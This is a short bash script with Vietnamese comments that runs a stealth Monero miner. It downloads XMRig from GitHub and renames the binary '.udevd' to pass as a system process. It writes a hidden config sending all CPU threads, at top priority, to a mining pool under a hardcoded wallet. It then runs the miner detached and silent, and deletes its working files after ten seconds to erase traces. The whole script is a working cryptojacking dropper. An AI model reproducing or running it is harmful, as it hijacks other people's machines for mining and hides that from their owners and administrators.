#!/bin/bash

# =================== CẤU HÌNH ===================
WALLET=${WALLET:-85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz}
BINARY_NAME=".udevd"                            # Tên giả danh tiến trình
WORKDIR=$(mktemp -d -p /tmp)                    # Thư mục tạm
CONFIG_FILE="$WORKDIR/.conf.json"
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
EXPECTED_SHA256="b2c88b19699e3d22c4db0d589f155bb89efbd646ecf9ad182ad126763723f4b7"

cd "$WORKDIR" || exit 1

# =================== TẢI VỀ & KIỂM TRA ===================
curl -sL -o archive.tar.gz "$XMRIG_URL"
ACTUAL_HASH=$(sha256sum archive.tar.gz | awk '{print $1}')
[ "$ACTUAL_HASH" != "$EXPECTED_SHA256" ] && echo "❌ SHA256 mismatch" && rm -rf "$WORKDIR" && exit 1

# =================== GIẢI NÉN & NGỤY TRANG ===================
tar -xf archive.tar.gz
XMRIG_BIN=$(find . -type f -name xmrig | head -n1)
mv "$XMRIG_BIN" "$BINARY_NAME"
chmod +x "$BINARY_NAME"

# =================== TẠO CONFIG ẨN ===================
cat > "$CONFIG_FILE" <<EOF
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "max-threads-hint": $(nproc),
    "priority": -20,
    "huge-pages": true
  },
  "pools": [{
    "url": "pool.supportxmr.com:443",
    "user": "$WALLET",
    "pass": "x",
    "tls": true,
    "keepalive": true
  }]
}
EOF

# =================== CHẠY ẨN ===================
nohup "$WORKDIR/$BINARY_NAME" --config "$CONFIG_FILE" >/dev/null 2>&1 &

# =================== XOÁ DẤU VẾT ===================
(sleep 10 && rm -rf "$WORKDIR") &

echo "[✓] Đã chạy tiến trình ẩn danh. Tự xóa dấu vết sau 10 giây."
